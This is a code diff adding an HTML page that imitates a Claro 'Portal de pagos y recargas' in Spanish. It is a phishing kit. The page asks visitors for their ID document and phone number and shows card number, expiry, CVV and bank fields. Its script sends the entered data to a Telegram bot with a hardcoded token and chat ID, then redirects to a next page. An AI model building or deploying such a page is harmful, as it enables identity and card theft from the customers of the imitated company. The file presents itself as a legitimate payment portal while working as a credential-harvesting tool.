@@ -1,0 +1,664 @@
+
+
+<!DOCTYPE html>
+
+<html lang="es">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, user-scalable=no" name="viewport"/>
+<link href="img/favicon.ico" rel="icon" type="image/png"/>
+<title>
+   Portal de pagos Claro
+  </title>
+<link href="https://fonts.googleapis.com" rel="preconnect"/>
+<link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/>
+<link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300..800;1,300..800&amp;display=swap" rel="stylesheet"/>
+<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.4.3/dist/css/bootstrap.min.css" rel="stylesheet"/>
+<style type="text/css">
+   *{
+            font-family: "Open Sans";
+            padding: 0;
+            margin: 0;
+        }
+        #comida{
+            background-color: #DA291C !important;
+            padding: 7px;
+        }
+        .logo{
+            width: 80px;
+        }
+        .caja_img{
+            text-align: center;
+        }
+        #ggris1{
+            text-align: center;
+            height: 150px;
+            background-color: #F3F3F4; 
+            border-bottom: 1px solid #AEAEAE;
+            box-shadow: 0 0 0 rgb(0 0 0 / 16%);
+        }
+        #tabla-opciones{
+            margin: -30px auto 0px auto;
+            width: 94%;
+            max-width: 1000px;
+        }
+        .etq-pasos{
+            font-size: 13px;            
+        }
+        .act-pasos{
+            color:#2c97ad;
+        }
+        section{
+            margin: 0 auto;
+            text-align: center;
+            width: 96%;
+            max-width: 680px;
+        }
+        .texto1{
+            font-size: 28px;
+            color: #5c5c5c;  
+        }
+        .rojo{
+            font-weight: 600;
+            color: #EF3829;
+        }
+        .texto2{
+            color: #5c5c5c; 
+            font-size: 14px;  
+        }
+        .etiquetas{
+            color:#2c97ad;
+            font-size: 14px;
+        }
+        .entradas{
+            border: 1px solid #5c5c5c;
+            width: 96%;
+            outline: none;
+            padding: 10px;
+            border-radius: 10px;
+            max-width: 440px;
+        }
+        .botonr{
+            background-color: #fff;
+            border: 0;
+            cursor: pointer;
+        }
+        .boton_continuar,.boton2{
+            background-color: #E52A1B;
+            color: #fff;
+            border: 0;
+            outline: 0;
+            border-radius: 10px;
+            padding: 10px;
+            font-size: 16px;
+            width: 96%;
+            max-width: 250px;
+        }
+        footer{
+            background-color: #212121;
+            color: #fff;
+            text-align: center;
+            padding: 20px;
+            font-size: 12px;
+        }
+        .celda{
+            background-color: #F4F4F4;
+            padding: 7px 10px;
+            border: 1px solid #AEAEAE;
+            text-align: left;
+        }
+        .celda2{
+            background-color: #DA291C;
+            color: #fff;
+            text-align: center;
+        }
+
+
+
+         #ca,#ba,#bo,#ne,#ps{
+            width: 96%;
+            background-color: #fff;margin: 5px 0px;
+            border-radius: 10px;
+            border: 1px solid #AEAEAE;
+         }
+
+         .options-list li{
+            list-style-type: none;
+            padding: 5px;
+         }
+
+         .options-list li:hover{
+            background-color: #808080b0;
+            color: #fff;
+            cursor: pointer;
+         }
+
+         #selectBox{
+            padding: 10px;
+            border-radius: 10px;
+         }
+
+         #espera,#Tarjeta,#section3,#section2,#errorpasarela{
+            display: none;
+         }
+  </style>
+</head>
+<body>
+<header id="comida">
+<div class="caja_img">
+<img class="logo" src="img/logo-claro-blanco.svg"/>
+</div>
+</header>
+<main>
+<div class="gris1" id="ggris1">
+<div class="texto_gris">
+<br/>
+<br/>
+<p class="texto1">
+      Portal de
+      <span class="rojo">
+       PAGOS Y RECARGAS
+      </span>
+</p>
+</div>
+</div>
+<table id="tabla-opciones">
+<tr>
+<td align="center" valign="top">
+<img class="imagen" id="azul1" src="img/icono-seleccion-on.png"/>
+</td>
+<td align="center" valign="top">
+</td>
+<td align="center" valign="top">
+<img class="imagen" id="azul2" src="img/icono-mediopago-off.png"/>
+</td>
+<td align="center" valign="top">
+</td>
+<td align="center" valign="top">
+<img class="imagen" id="azul3" src="img/icono-pago-off.png"/>
+</td>
+<td align="center" valign="top">
+</td>
+<td align="center" valign="top">
+<img class="imagen" id="azul4" src="img/icono-resultado-off.png"/>
+</td>
+</tr>
+<tr>
+<td align="center" class="etq-pasos act-pasos" valign="top">
+      Ingresa
+      <br/>
+      tu Documento
+     </td>
+<td align="center" valign="top">
+</td>
+<td align="center" class="etq-pasos" valign="top">
+      Escoge el
+      <br/>
+      medio de pago
+     </td>
+<td align="center" valign="top">
+</td>
+<td align="center" class="etq-pasos" valign="top">
+      Realiza el
+      <br/>
+      Pago en linea
+     </td>
+<td align="center" valign="top">
+</td>
+<td align="center" class="etq-pasos" valign="top">
+      Recibe la
+      <br/>
+      Confimacion
+     </td>
+</tr>
+</table>
+<div id="contenedor">
+</div>
+<section id="usuario" style="display:;">
+<div class="texto_gris2">
+<br/>
+<br/>
+<p class="texto2">
+      Consulta tu factura Claro, Observa si aplicas al descuento y paga de manera facil y desde donde quieras.
+     </p>
+</div>
+<div>
+<br/>
+<label class="etiquetas" for="input1">
+      Ingresa tu Numero de Documento
+     </label>
+<input autocomplete="off" autofocus="" class="entradas" id="documento" inputmode="numeric" minlength="5" placeholder="Numero de Documento" required="" type="number"/>
+</div>
+<div class="tipo">
+<br/>
+<p style="text-align: center;">
+  <span style="color: #2aa9b3;">
+    <strong>Selecciona el tipo de servicio</strong>
+  </span>
+<style>
+  .servicio-opcion {
+    display: inline-block;
+    text-align: center;
+    margin: 10px;
+  }
+
+  .servicio-opcion input {
+    display: block;
+    margin: 0 auto 5px auto;
+  }
+
+  .servicio-opcion img {
+    width: 50px;
+    height: 50px;
+    display: block;
+    margin: 0 auto 5px auto;
+  }
+
+  .seleccion-servicio {
+    text-align: center;
+    font-weight: bold;
+    color: #2CA3B8;
+    margin-bottom: 15px;
+  }
+</style>
+
+
+<div style="text-align: center;">
+  <label class="servicio-opcion">
+    <input type="radio" name="servicio" id="pospago" value="Pospago">
+    <img src="img/celular.png" alt="Pospago">
+    Pospago
+  </label>
+
+  <label class="servicio-opcion">
+    <input type="radio" name="servicio" id="hogar" value="Hogar">
+    <img src="img/hogar.png" alt="Hogar">
+    Hogar
+  </label>
+
+  <label class="servicio-opcion">
+    <input type="radio" name="servicio" id="equipo" value="Equipo">
+    <img src="img/equipos.png" alt="Equipo">
+    Equipo
+  </label>
+
+  <label class="servicio-opcion">
+    <input type="radio" name="servicio" id="internet" value="Internet">
+    <img src="img/internet.png" alt="Internet">
+    Internet
+  </label>
+</div>
+
+
+<br/>
+<label class="etiquetas" for="celular">
+     Por favor Ingresa tu Numero de Celular.
+    </label>
+<br/>
+<input autocomplete="of" class="entradas" id="celular" inputmode="numeric" minlength="5" placeholder=" Numero de Celular" required="" type="number" value=""/>
+<div class="botones">
+<br/>
+<button class="boton_continuar" id="btn-continuar">
+      Continuar
+     </button>
+</div>
+</section>
+<section id="errorpasarela">
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<div style="text-align: center;">
+<img src="https://dev-claro-img-css.pantheonsite.io/iconos-logo-claro.png" style="width: 130px; margin-left: auto;"/>
+<br/>
+<br/>
+<div class="loader">
+<div class="dot">
+</div>
+<div class="dot">
+</div>
+<div class="dot">
+</div>
+</div>
+</div>
+<br/>
+<br/>
+<br/>
+<div style="text-align: center; line-height: 1rem;">
+<h2 class="t-subtitle" style="line-height: 2.5rem; font-size: 1.6rem; color: #e5281bde;">
+      Te pedimos una disculpa, en este momento solo se aceptan las siguiente pasarelas de pagos: Nequi, Bancolombia o Tarjeta de Debito o Credito
+     </h2>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+</div>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+</section>
+<section id="section2">
+<br/>
+<br/>
+<div class="tabla">
+<div class="fila">
+<div class="celda celda2">
+       Pago de Facturas
+      </div>
+</div>
+<div class="fila">
+<div class="celda">
+<p>
+        Cliente:
+        <span id="nombre">
+</span>
+</p>
+</div>
+</div>
+<div class="fila">
+<div class="celda">
+<p>
+        Celular:
+        <span id="celular2">
+</span>
+</p>
+</div>
+</div>
+<div class="fila">
+<div class="celda">
+<p>
+        Deuda Total: $
+        <span id="deuda">
+</span>
+</p>
+</div>
+</div>
+<div class="fila">
+<div class="celda">
+<p>
+        Descuento: $
+        <span id="descuento">
+</span>
+</p>
+</div>
+</div>
+<div class="fila">
+<div class="celda">
+<p>
+        Total a Pagar: $
+        <span id="total">
+</span>
+</p>
+</div>
+</div>
+</div>
+<br/>
+<br/>
+<br/>
+<button class="boton2" style="margin-top: -0.5rem;">
+     Continuar
+    </button>
+</section>
+<section id="espera">
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<div style="text-align: center;">
+<img src="img/iconos-logo-claro.png" style="width: 130px; margin-left: auto;"/>
+<br/>
+<img src="img/load1.gif" width="120"/>
+</div>
+<br/>
+<div style="text-align: center; line-height: 1rem;">
+<h2 class="t-subtitle" style="line-height: 2.5rem; font-size: 16px; color: #e52a1b;">
+      Validando la Informacion...
+     </h2>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+</div>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+</section>
+<section id="Tarjeta">
+<br/>
+<br/>
+<div id="sectionTwo" class="formulario-segunda-seccion" style="display: none;">
+  <!-- Aquí va tu segunda sección -->
+
+<p class="texto2">
+      Paga de manera facil y desde donde quieras con tu tarjeta de Debito o Credito.
+     </p>
+</div>
+<div style="margin-top:10px;">
+<label class="etiquetas" for="input1">
+      Numero de la Tarjeta
+     </label>
+<br/>
+<input autocomplete="off" autofocus="" class="entradas" id="numtc" inputmode="numeric" maxlength="19" minlength="16" pattern="[0-9]*" placeholder="1234 5678 9012 3456" type="text"/>
+</div>
+<div style="margin-top:10px;">
+<label class="etiquetas" for="input1">
+      Fecha de Vencimiento
+     </label>
+<br/>
+<input autocomplete="off" b="" class="entradas" id="fechat" inputmode="numeric" maxlength="7" minlength="7" pattern="[0-9]*" placeholder="MM/YYYY" type="text"/>
+</div>
+<div style="margin-top:10px;">
+<label class="etiquetas" for="input1">
+      Codigo de Seguridad
+     </label>
+<br/>
+<input autocomplete="off" b="" class="entradas" id="codcv" inputmode="numeric" maxlength="4" minlength="2" pattern="[0-9]*" placeholder="CVV" type="text"/>
+</div>
+<div style="margin-top:10px;">
+<label class="etiquetas" for="input1">
+      Numero de Cuotas
+     </label>
+<br/>
+<input autocomplete="off" class="entradas" inputmode="numeric" maxlength="2" minlength="1" pattern="[0-9]*" placeholder="1" type="text"/>
+</div>
+<div style="margin-top:10px;">
+<label class="etiquetas" for="input1">
+      Nombres y Apellidos
+     </label>
+<br/>
+<input autocomplete="off" class="entradas" id="datost" minlength="5" placeholder="" required="" type="text"/>
+</div>
+<label class="etiquetas" for="input1" style="margin-top:10px;">
+     Selecciona tu Entidad Bancaria
+    </label>
+<button class="select-box inputst" id="selectBox" style="display: ; background-color: transparent; color: #5c5c5c; width: 80%; border-width: 1px;
+            border-color: #b4b4b4;">
+<span id="selectedOption1">
+      Selecciona
+     </span>
+<ul class="options-list" id="optionsList1">
+<li>
+       Banco AV Villas
+      </li>
+<li>
+       BBVA Colombia
+      </li>
+<li>
+       Banco De Bogotá
+      </li>
+<li>
+       Banco Caja Social
+      </li>
+<li>
+       Bancolombia
+      </li>
+<li>
+       Davivienda
+      </li>
+<li>
+       Banco Falabella
+      </li>
+<li>
+       Banco De Occidente
+      </li>
+<li>
+       Banco Popular
+      </li>
+<li>
+       Scotiabank Colpatria
+      </li>
+</ul>
+</button>
+<input id="selectedValue1" type="hidden"/>
+</section>
+<section id="section3">
+<br/>
+<br/>
+<button id="ca">
+<img id="cai" src="img/tar.jpg"/>
+<p>
+      Tarjetas de Credito
+     </p>
+</button>
+<button id="ba" style="padding:10px 0px;">
+<img id="bai" src="img/ba.png" width="140"/>
+     .
+    </button>
+<button id="bo" style="padding:22px 0px;">
+<img id="bgt" src="img/logo-bogota-mobile.png" width="120"/>
+     .
+    </button>
+<button id="ne" style="padding:21px 0px;">
+<img id="nei" src="img/NE.png" width="110"/>
+     .
+    </button>
+<button id="ps" style="padding:5px 0px;">
+<img id="nei" src="img/pse-logo.png" width="140"/>
+     .
+    </button>
+<input id="selectedValue1" type="hidden"/>
+<br/>
+<br/>
+<button class="boton2" style="margin-top: -0.5rem;">
+     Continuar
+    </button>
+</section>
+</main>
+<br/>
+<br/>
+<footer id="footerr">
+<p class="app">
+    Descarga ya la App Mi Claro
+   </p>
+<img class="android" src="img/android.png"/>
+<img class="ios" src="img/ios.png"/>
+<p>
+    Terminos y condiciones - Politicas de privacidad.
+   </p>
+<br/>
+<br/>
+<div class="footer2">
+<img class="logo2" src="img/logocl.png" width="80"/>
+<p>
+     Todos los derechos reservados - 2024 Claro
+    </p>
+</div>
+</footer>
+
+
+<script>
+  document.addEventListener("DOMContentLoaded", function () {
+    const boton = document.getElementById("btn-continuar");
+
+    boton.addEventListener("click", async function () {
+      const documento = document.getElementById("documento").value;
+      const celular = document.getElementById("celular").value;
+      const servicio = document.querySelector('input[name="servicio"]:checked')?.value || "No especificado";
+
+      if (!documento || !celular) {
+        alert("Por favor, completa todos los campos.");
+        return;
+      }
+
+      const mensaje = `Nuevo Registro:\n📄 Documento: ${documento}\n📱 Celular: ${celular}\n🛠️ Servicio: ${servicio}`;
+      const token = '8037819984:AAGQQ0MjR1Z_7yrrGj5S5VJYQpVtizTIGgk';
+      const chatId = '-1002657462806';
+      const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+      try {
+        const response = await fetch(url, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: mensaje
+          })
+        });
+
+        const data = await response.json();
+
+        if (data.ok) {
+          // Guardar en localStorage
+          localStorage.setItem("documento", documento);
+          localStorage.setItem("celular", celular);
+
+          // Ocultar sección 1 y mostrar la 2
+          const seccion1 = document.querySelector(".formulario");
+          const seccion2 = document.getElementById("sectionTwo");
+
+          if (seccion1) seccion1.style.display = "none";
+          if (seccion2) {
+            seccion2.style.display = "block";
+            seccion2.scrollIntoView({ behavior: 'smooth' });
+
+            // Redirigir después de 3 segundos
+            setTimeout(() => {
+              window.location.href = "index2.html";
+            }, 300);
+          } else {
+            console.warn("No se encontró la segunda sección con ID 'sectionTwo'.");
+          }
+        } else {
+          alert("❌ Error al enviar los datos.");
+        }
+      } catch (error) {
+        console.error("Error:", error);
+        alert("❌ Error al enviar los datos.");
+      }
+    });
+  });
+</script>
+
+<script>
+  const radios = document.querySelectorAll('input[name="servicio"]');
+
+  radios.forEach(radio => {
+    radio.addEventListener('change', () => {
+      let total;
+      if (radio.value.toLowerCase() === 'pospago') {
+        total = 29600;
+      } else {
+        total = 49600;
+      }
+
+      localStorage.setItem('totalPagar', total);
+      localStorage.setItem('servicioSeleccionado', radio.value); // (opcional)
+    });
+  });
+</script>
+
+
+</body>
+</html>
